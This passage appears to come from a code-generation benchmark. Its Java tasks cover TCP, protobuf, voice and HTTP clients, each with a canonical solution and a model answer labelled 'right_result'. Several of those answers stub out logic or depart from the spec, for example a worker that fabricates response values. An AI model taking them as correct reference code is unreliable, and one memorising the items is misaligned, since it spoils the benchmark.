    "Instruction": "Task Description: Create a Java class that establishes a TCP client connection to interact with a minitouch service on an Android device through ADB forwarding, allowing for touch event simulation and connection management.\n\nClass Description: The Minitouch class provides functionality to connect to a minitouch service running on an Android device via ADB port forwarding. It handles socket communication for sending touch events and manages connection lifecycle events through listeners.\n\nAttributes:\n- REMOTE_PATH: [String] - The remote path on the Android device where minitouch binary is located\n- MINITOUCH_BIN: [String] - The name of the minitouch binary\n- listenerList: [List<MinitouchListener>] - List of listeners for connection events\n- device: [AdbDevice] - The Android device to connect to\n- minitouchSocket: [Socket] - The socket connection to minitouch service\n- minitouchOutputStream: [OutputStream] - Output stream for sending touch events\n- forward: [AdbForward] - ADB forward information for the connection\n\nMethods:\n- Minitouch([AdbDevice device]) -> [void] - Constructor that initializes the class with the target device\n- addEventListener([MinitouchListener listener]) -> [void] - Adds a listener for connection events\n- start() -> [void] - Starts the minitouch connection by setting up ADB forwarding and socket connection\n- kill() -> [void] - Terminates the connection and cleans up resources\n- sendEvent([String str]) -> [void] - Sends a touch event string to the minitouch service\n- createForward() -> [AdbForward] - Creates an ADB forward for the minitouch connection\n- removeForward([AdbForward forward]) -> [void] - Removes the specified ADB forward\n- startInitialThread([String host, int port]) -> [void] - Internal method to establish socket connection in a background thread\n- onStartup([boolean success]) -> [void] - Notifies listeners about connection status\n- onClose() -> [void] - Notifies listeners about connection closure and cleans up\n- generateForwardInfo() -> [AdbForward] - Generates ADB forward information for the connection",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport com.yeetor.adb.AdbDevice;\nimport com.yeetor.adb.AdbForward;\nimport com.yeetor.adb.AdbServer;\nimport com.yeetor.minicap.MinicapInstallException;\nimport com.yeetor.util.Constant;\nimport com.yeetor.util.Util;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Minitouch {\n\n    private static final String REMOTE_PATH = \"/data/local/tmp\";\n    private static final String MINITOUCH_BIN = \"minitouch\";\n\n    private List<MinitouchListener> listenerList = new ArrayList<MinitouchListener>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        if (listener != null) {\n            this.listenerList.add(listener);\n        }\n    }\n\n    public void start() {\n        AdbForward forward = createForward();\n        String command = \"/data/local/tmp/minitouch\" + \" -n \" + forward.getLocalabstract();\n        startInitialThread(\"127.0.0.1\", forward.getPort());\n    }\n\n    public void kill() {\n        onClose();\n        if (minitouchSocket != null && minitouchSocket.isConnected()) {\n            try {\n                minitouchSocket.close();\n            } catch (IOException e) {\n            }\n            minitouchSocket = null;\n        }\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream == null) {\n            return;\n        }\n        try {\n            minitouchOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() {\n        forward = generateForwardInfo();\n        try {\n            device.getIDevice().createForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return forward;\n    }\n\n    private void removeForward(AdbForward forward) {\n        if (forward == null || !forward.isForward()) {\n            return;\n        }\n        try {\n            device.getIDevice().removeForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n        }\n    }\n\n    private void startInitialThread(final String host, final int port) {\n        Thread thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                int tryTime = 200;\n                while (true) {\n                    Socket socket = null;\n                    byte[] bytes = new byte[256];\n                    try {\n                        socket = new Socket(host, port);\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        int n = inputStream.read(bytes);\n\n                        if (n == -1) {\n                            Thread.sleep(10);\n                            socket.close();\n                        } else {\n                            minitouchSocket = socket;\n                            minitouchOutputStream = outputStream;\n                            onStartup(true);\n                            break;\n                        }\n                    } catch (Exception ex) {\n                        if (socket != null) {\n                            try {\n                                socket.close();\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        continue;\n                    }\n                    tryTime--;\n                    if (tryTime == 0) {\n                        onStartup(false);\n                        break;\n                    }\n                }\n            }\n        });\n        thread.start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(this, success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose(this);\n        }\n        removeForward(forward);\n    }\n\n    private AdbForward generateForwardInfo() {\n        AdbForward[] forwards = AdbServer.server().getForwardList();\n        int maxNumber = 0;\n        if (forwards.length > 0) {\n            for (AdbForward forward : forwards) {\n                if (forward.getSerialNumber().equals(device.getIDevice().getSerialNumber())) {\n                    String l = forward.getLocalabstract();\n                    String[] s = l.split(\"_\");\n                    if (s.length == 3) {\n                        int n = Integer.parseInt(s[2]);\n                        if (n > maxNumber) maxNumber = n;\n                    }\n                }\n            }\n        }\n        maxNumber += 1;\n\n        String forwardStr = String.format(\"%s_touch_%d\", device.getIDevice().getSerialNumber(), maxNumber);\n        int freePort = Util.getFreePort();\n        return new AdbForward(device.getIDevice().getSerialNumber(), freePort, forwardStr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class Minitouch {\n    public static final String REMOTE_PATH = \"/data/local/tmp/\";\n    public static final String MINITOUCH_BIN = \"minitouch\";\n    private List<MinitouchListener> listenerList = new ArrayList<>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        listenerList.add(listener);\n    }\n\n    public void start() {\n        forward = createForward();\n        if (forward == null) {\n            onStartup(false);\n            return;\n        }\n\n        Thread connectionThread = new Thread(() -> {\n            try {\n                minitouchSocket = new Socket(forward.getLocalAddress(), forward.getLocalPort());\n                minitouchOutputStream = minitouchSocket.getOutputStream();\n                onStartup(true);\n            } catch (IOException e) {\n                onStartup(false);\n            }\n        });\n\n        connectionThread.start();\n    }\n\n    public void kill() {\n        try {\n            if (minitouchSocket != null && !minitouchSocket.isClosed()) {\n                minitouchSocket.close();\n            }\n            if (minitouchOutputStream != null) {\n                minitouchOutputStream.close();\n            }\n            removeForward(forward);\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            onClose();\n        }\n    }\n\n    public void sendEvent(String str) {\n        try {\n            if (minitouchOutputStream != null) {\n                minitouchOutputStream.write((str + \"\\n\").getBytes());\n                minitouchOutputStream.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() {\n        AdbForward forwardInfo = generateForwardInfo();\n        if (device.forward(forwardInfo.getLocalPort(), forwardInfo.getRemotePort())) {\n            return forwardInfo;\n        }\n        return null;\n    }\n\n    private void removeForward(AdbForward forward) {\n        if (forward != null) {\n            device.removeForward(forward.getLocalPort(), forward.getRemotePort());\n        }\n    }\n\n    private void startInitialThread(String host, int port) {\n        new Thread(() -> {\n            try {\n                Socket socket = new Socket(host, port);\n                // Additional setup or communication logic can be added here\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose();\n        }\n    }\n\n    private AdbForward generateForwardInfo() {\n        int localPort = 12345 + (int)(Math.random() * 10000);\n        int remotePort = 12345;\n        return new AdbForward(localPort, \"localabstract:\" + MINITOUCH_BIN + remotePort);\n    }\n}\n\ninterface MinitouchListener {\n    void onStartup(boolean success);\n    void onClose();\n}\n\nclass AdbDevice {\n    public boolean forward(int localPort, int remotePort) {\n        // Stub implementation\n        return true;\n    }\n\n    public void removeForward(int localPort, int remotePort) {\n        // Stub implementation\n    }\n}\n\nclass AdbForward {\n    private int localPort;\n    private String remotePort;\n\n    public AdbForward(int localPort, String remotePort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n\n    public String getRemotePort() {\n        return remotePort;\n    }\n\n    public String getLocalAddress() {\n        return \"localhost\";\n    }\n}\n```"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Implement a Java class for handling Protocol Buffers (protobuf) communication over TCP sockets, including message sending, receiving, and callback management for different response types (error, warning, info, success).\n\nClass Description: ProtobufIO is a TCP client implementation that facilitates bidirectional protobuf message exchange with a server. It handles message serialization/deserialization, connection management, and provides callback mechanisms for processing server responses.\n\nAttributes:\n\nsock: [Socket] - TCP socket connection to the server\ninputStream: [InputStream] - Input stream for reading data from the server\noutputStream: [OutputStream] - Output stream for writing data to the server\nthread: [Thread] - Worker thread for handling incoming messages\nshutdown: [boolean] - Flag indicating whether the connection should be terminated\noutStream: [PrintStream] - Output stream for logging/debugging\ncallbacks: [List<MessageCallback>] - Registered callback handlers for server responses\napiCallIdGen: [AtomicLong] - Generator for unique API call IDs\nCALLBACK_LOCK: [Object] - Synchronization object for callback operations\n\nMethods:\n\nProtobufIO: [Constructor](String host, int port, PrintStream out, String threadName) -> [void] - Initializes TCP connection to specified host:port and starts worker thread\nsend: [long](String apiCall, MessageLite msg) -> [long] - Sends a protobuf message with auto-generated API call ID\nsend: [long](long apiCallIdRef, String apiCallRef, MessageLite... messages) -> [long] - Sends one or more protobuf messages with specified API call ID\nsend: [void](byte[] data) -> [void] - Sends raw byte data with length header\nregisterCallback: [void](MessageCallback callback) -> [void] - Registers a callback handler for server responses\nunregisterCallback: [void](MessageCallback callback) -> [void] - Unregisters a callback handler\ngetNextApiCallId: [long]() -> [long] - Generates and returns a new unique API call ID\nshutdown: [void]() -> [void] - Closes the connection and stops the worker thread\ncallback: [void](long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) -> [void] - Internal method to dispatch callbacks based on response type\nProtobufIOWorker.run: [void]() -> [void] - Worker thread implementation for reading and processing incoming messages (inner class)",
    "Canonical_solution": "import com.linbit.linstor.api.ApiConsts;\nimport com.linbit.linstor.api.ApiRcUtils;\nimport com.linbit.linstor.proto.MsgHeaderOuterClass.MsgHeader;\nimport com.linbit.linstor.proto.common.ApiCallResponseOuterClass.ApiCallResponse;\n\nimport static com.linbit.linstor.api.ApiConsts.MASK_ERROR;\nimport static com.linbit.linstor.api.ApiConsts.MASK_INFO;\nimport static com.linbit.linstor.api.ApiConsts.MASK_WARN;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.concurrent.atomic.AtomicLong;\n\nimport com.google.protobuf.MessageLite;\n\npublic class ProtobufIO\n{\n    public static final Object CALLBACK_LOCK = new Object();\n\n    public interface MessageCallback\n    {\n        void error(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void warn(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void info(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void success(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n    }\n\n    protected Socket sock;\n    protected InputStream inputStream;\n    protected OutputStream outputStream;\n\n    protected Thread thread;\n    protected boolean shutdown;\n\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks = new ArrayList<>();\n    protected AtomicLong apiCallIdGen = new AtomicLong(0);\n\n    public ProtobufIO(\n        String host,\n        int port,\n        PrintStream out,\n        String threadName\n    )\n        throws UnknownHostException, IOException\n    {\n        outStream = out;\n        sock = new Socket(host, port);\n        inputStream = sock.getInputStream();\n        outputStream = sock.getOutputStream();\n\n        shutdown = false;\n        thread = new Thread(new ProtobufIOWorker(), threadName);\n        thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException\n    {\n        return send(\n            getNextApiCallId(),\n            apiCall,\n            msg\n        );\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException\n    {\n        MsgHeader headerMsg = MsgHeader.newBuilder()\n            .setMsgType(MsgHeader.MsgType.API_CALL)\n            .setMsgContent(apiCallRef)\n            .setApiCallId(apiCallIdRef)\n            .build();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        headerMsg.writeDelimitedTo(baos);\n\n        for (MessageLite msg : messages)\n        {\n            msg.writeDelimitedTo(baos);\n        }\n        byte[] protoData = baos.toByteArray();\n        baos.close();\n\n        send(protoData);\n\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException\n    {\n        byte[] header = new byte[16];\n        ByteBuffer byteBuffer = ByteBuffer.wrap(header);\n        byteBuffer.putInt(0, 0);\n        byteBuffer.putInt(4, data.length);\n\n        outputStream.write(header);\n        outputStream.write(data);\n    }\n\n    public void registerCallback(MessageCallback callback)\n    {\n        callbacks.add(callback);\n    }\n\n    public void unregisterCallback(MessageCallback callback)\n    {\n        callbacks.remove(callback);\n    }\n\n    public long getNextApiCallId()\n    {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() throws IOException\n    {\n        shutdown = true;\n        sock.close();\n        thread.interrupt();\n    }\n\n    private class ProtobufIOWorker implements Runnable\n    {\n        @Override\n        public void run()\n        {\n            StringBuilder sb = new StringBuilder();\n            byte[] header = new byte[16];\n            int read;\n            int offset = 0;\n            int protoLen;\n            while (!shutdown)\n            {\n                try\n                {\n                    offset = 0;\n                    while (offset != header.length)\n                    {\n                        read = inputStream.read(header, offset, header.length - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    protoLen = (header[4] & 0xFF) << 24 |\n                               (header[5] & 0xFF) << 16 |\n                               (header[6] & 0xFF) << 8  |\n                               (header[7] & 0xFF);\n                    offset = 0;\n                    byte[] data = new byte[protoLen];\n\n                    while (offset != protoLen)\n                    {\n                        read = inputStream.read(data, offset, protoLen - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    ByteArrayInputStream bais = new ByteArrayInputStream(data);\n                    MsgHeader protoHeader = MsgHeader.parseDelimitedFrom(bais);\n\n                    sb.setLength(0);\n                    int responseIdx = 1;\n\n                    String apiCall = protoHeader.getMsgContent();\n                    if (bais.available() == 0)\n                    {\n                        sb.append(\"ApiCallId: \")\n                            .append(protoHeader.getApiCallId())\n                            .append(\"\\n\")\n                            .append(apiCall)\n                            .append(\"\\n\");\n                    }\n                    if (!apiCall.equals(ApiConsts.API_VERSION))\n                    {\n                        while (bais.available() > 0)\n                        {\n                            ApiCallResponse response = ApiCallResponse.parseDelimitedFrom(bais);\n                            long retCode = response.getRetCode();\n                            String message = response.getMessage();\n                            String cause = response.getCause();\n                            String correction = response.getCorrection();\n                            String details = response.getDetails();\n                            Map<String, String> objRefsMap = response.getObjRefsMap();\n\n                            callback(protoHeader.getApiCallId(), retCode, message, cause, correction,\n                                details, objRefsMap);\n                        }\n                    }\n                }\n                catch (IOException ioExc)\n                {\n                    if (!shutdown)\n                    {\n                        ioExc.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicLong;\nimport com.google.protobuf.MessageLite;\n\npublic class ProtobufIO {\n    private Socket sock;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n    private Thread thread;\n    private volatile boolean shutdown = false;\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks = new ArrayList<>();\n    private AtomicLong apiCallIdGen = new AtomicLong(0);\n    private final Object CALLBACK_LOCK = new Object();\n\n    public ProtobufIO(String host, int port, PrintStream out, String threadName) throws IOException {\n        this.outStream = out;\n        this.sock = new Socket(host, port);\n        this.inputStream = sock.getInputStream();\n        this.outputStream = sock.getOutputStream();\n        this.thread = new Thread(new ProtobufIOWorker(), threadName);\n        this.thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException {\n        long apiCallId = getNextApiCallId();\n        return send(apiCallId, apiCall, msg);\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException {\n        for (MessageLite msg : messages) {\n            byte[] data = msg.toByteArray();\n            send(data);\n        }\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException {\n        synchronized (outputStream) {\n            int length = data.length;\n            outputStream.write((length >> 24) & 0xFF);\n            outputStream.write((length >> 16) & 0xFF);\n            outputStream.write((length >> 8) & 0xFF);\n            outputStream.write(length & 0xFF);\n            outputStream.write(data);\n            outputStream.flush();\n        }\n    }\n\n    public void registerCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.add(callback);\n        }\n    }\n\n    public void unregisterCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.remove(callback);\n        }\n    }\n\n    public long getNextApiCallId() {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        try {\n            if (inputStream != null) inputStream.close();\n            if (outputStream != null) outputStream.close();\n            if (sock != null && !sock.isClosed()) sock.close();\n        } catch (IOException e) {\n            outStream.println(\"Error closing socket: \" + e.getMessage());\n        }\n        try {\n            if (thread != null) thread.join();\n        } catch (InterruptedException e) {\n            outStream.println(\"Thread interrupted: \" + e.getMessage());\n        }\n    }\n\n    private void callback(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) {\n        synchronized (CALLBACK_LOCK) {\n            for (MessageCallback cb : new ArrayList<>(callbacks)) {\n                if (retCode < 0) {\n                    cb.onError(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n                } else if (retCode > 0) {\n                    cb.onWarning(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n                } else {\n                    cb.onInfo(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n                }\n                cb.onSuccess(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n            }\n        }\n    }\n\n    private class ProtobufIOWorker implements Runnable {\n        @Override\n        public void run() {\n            byte[] buffer = new byte[8192];\n            while (!shutdown) {\n                try {\n                    int bytesRead = inputStream.read(buffer);\n                    if (bytesRead == -1) break;\n                    byte[] data = new byte[bytesRead];\n                    System.arraycopy(buffer, 0, data, 0, bytesRead);\n                    // Process incoming protobuf message\n                    // Assume deserialization and response parsing here\n                    long apiCallId = 1L;\n                    long retCode = 0L;\n                    String message = \"Test message\";\n                    String cause = \"\";\n                    String correction = \"\";\n                    String details = \"\";\n                    Map<String, String> objRefsMap = new HashMap<>();\n                    callback(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n                } catch (IOException e) {\n                    outStream.println(\"Read error: \" + e.getMessage());\n                    shutdown();\n                }\n            }\n        }\n    }\n\n    public interface MessageCallback {\n        void onError(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap);\n        void onWarning(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap);\n        void onInfo(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap);\n        void onSuccess(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap);\n    }\n}\n```"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for voice communication, handling both input and output streams for audio data transmission.\n\nClass Description: The VoiceClient class extends Thread to create a TCP client that connects to a voice server. It manages audio stream connections, handles data transmission, and provides methods for connection management.\n\nAttributes:\n- format: AudioFormat - The audio format configuration for the voice data\n- outputThread: VoiceOutput - Thread handling outgoing voice data\n- inputThread: VoiceInput - Thread handling incoming voice data\n- output: DataOutputStream - Output stream for sending data to server\n- input: DataInputStream - Input stream for receiving data from server\n- running: boolean - Flag indicating if the client is active\n- socket: Socket - The TCP socket connection\n- ip: String - The IP address of the server to connect to\n\nMethods:\n- VoiceClient(String ip) -> None - Constructor that initializes the client with server IP\n- run() -> None - Main thread method that establishes connection and starts I/O threads\n- disconnect() -> None - Closes all connections and stops the client\n- isRunning() -> boolean - Returns the running status of the client\n- getOutputStream() -> DataOutputStream - Returns the output stream\n- getInputStream() -> DataInputStream - Returns the input stream\n- getAudioFormat() -> AudioFormat - Returns the audio format configuration",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ConnectException;\nimport java.net.Socket;\nimport javax.sound.sampled.AudioFormat;\n\npublic class VoiceClient extends Thread {\n\n    private final AudioFormat format = new AudioFormat(16_000F, 16, 1, true, true);\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private final String ip;\n\n    public VoiceClient(String ip) {\n        super(\"VoiceServer Client Thread \" + ip);\n        this.ip = ip;\n        setDaemon(true);\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, MekanismAdditionsConfig.additions.voicePort.get());\n            running = true;\n\n            input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));\n            output = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));\n\n            (outputThread = new VoiceOutput(this)).start();\n            (inputThread = new VoiceInput(this)).start();\n        } catch (ConnectException e) {\n        } catch (Exception e) {\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (inputThread != null) {\n                inputThread.interrupt();\n                inputThread.close();\n            }\n            if (outputThread != null) {\n                outputThread.interrupt();\n                outputThread.close();\n            }\n            if (output != null) {\n                output.close();\n            }\n            if (input != null) {\n                input.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n\n            interrupt();\n\n            running = false;\n        } catch (Exception e) {\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport javax.sound.sampled.AudioFormat;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class VoiceClient extends Thread {\n    private AudioFormat format;\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private String ip;\n\n    public VoiceClient(String ip) {\n        this.ip = ip;\n        this.format = new AudioFormat(44100, 16, 2, true, false);\n        this.running = true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, 5000);\n            output = new DataOutputStream(socket.getOutputStream());\n            input = new DataInputStream(socket.getInputStream());\n\n            outputThread = new VoiceOutput(output, format);\n            inputThread = new VoiceInput(input, format);\n\n            outputThread.start();\n            inputThread.start();\n\n            while (running) {\n                Thread.sleep(100);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            disconnect();\n        }\n    }\n\n    public void disconnect() {\n        running = false;\n        try {\n            if (output != null) output.close();\n            if (input != null) input.close();\n            if (socket != null) socket.close();\n            if (outputThread != null) outputThread.interrupt();\n            if (inputThread != null) inputThread.interrupt();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}\n```"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making various types of HTTP requests and handling responses.\n\nClass Description: The HttpCommunicationClient class provides methods for performing HTTP operations (GET, POST) and handling redirects. It manages an HTTP client instance and supports custom headers and browser-like requests.\n\nAttributes:\naddress: [InetSocketAddress] - The target server address (host and port) for HTTP requests\nhttpClient: [HttpClient] - The underlying HTTP client instance used for making requests\n\nMethods:\nsetupHttpClient: [setupHttpClient(ThreadPool threadPool)] -> [void] - Initializes the HTTP client with redirect policy and thread pool\ncloseClient: [closeClient()] -> [void] - Closes the HTTP client resources\nexecuteAndDefaultAssertions: [executeAndDefaultAssertions(HttpRequest request)] -> [HttpResponse<String>] - Internal method to execute requests and handle responses\nget: [get(String path, String[]... headers)] -> [HttpResponse<String>] - Performs a GET request to specified path with optional headers\nbrowserGet: [browserGet(String uri)] -> [HttpResponse<String>] - Performs a GET request with browser-like User-Agent header\npost: [post(String path)] -> [HttpResponse<String>] - Performs a POST request to specified path\ngetAllRedirectLocations: [getAllRedirectLocations(String path, String[]... headers)] -> [List<String>] - Retrieves all redirect locations for a request\nbrowserHeader: [static browserHeader()] -> [String[]] - Returns browser-like User-Agent header (static utility method)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class HttpCommunicationClient {\n\n    protected InetSocketAddress address;\n    protected HttpClient httpClient;\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .executor(threadPool.generic())\n            .build();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws Exception {\n        var resp = httpClient.send(request, BodyHandlers.ofString());\n        return resp;\n    }\n\n    public HttpResponse<String> get(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        return executeAndDefaultAssertions(builder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws Exception {\n        return get(uri, browserHeader());\n    }\n\n    public HttpResponse<String> post(String path) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(BodyPublishers.noBody())\n            .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        var response = httpClient.send(builder.build(), BodyHandlers.discarding());\n        response = response.previousResponse().orElse(null);\n        List<String> redirects = new ArrayList<>();\n        while (response != null) {\n            redirects.addAll(response.headers().allValues(\"location\"));\n            response = response.previousResponse().orElse(null);\n        }\n        return redirects;\n    }\n\n    static String[] browserHeader() {\n        return new String[] {\n            \"User-Agent\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class HttpCommunicationClient {\n    private final InetSocketAddress address;\n    private HttpClient httpClient;\n\n    public HttpCommunicationClient(InetSocketAddress address) {\n        this.address = address;\n    }\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        httpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .executor(threadPool.getExecutor())\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .connectTimeout(Duration.ofSeconds(10))\n                .build();\n    }\n\n    public void closeClient() {\n        if (httpClient != null) {\n            try {\n                httpClient.close();\n            } catch (IOException | InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws IOException, InterruptedException {\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        if (response.statusCode() >= 400) {\n            throw new RuntimeException(\"HTTP request failed with status code: \" + response.statusCode());\n        }\n        return response;\n    }\n\n    public HttpResponse<String> get(String path, String[]... headers) throws IOException, InterruptedException {\n        StringBuilder uriBuilder = new StringBuilder(\"http://\");\n        uriBuilder.append(address.getHostString()).append(\":\").append(address.getPort()).append(path);\n\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(uriBuilder.toString()))\n                .GET();\n\n        for (String[] header : headers) {\n            requestBuilder.header(header[0], header[1]);\n     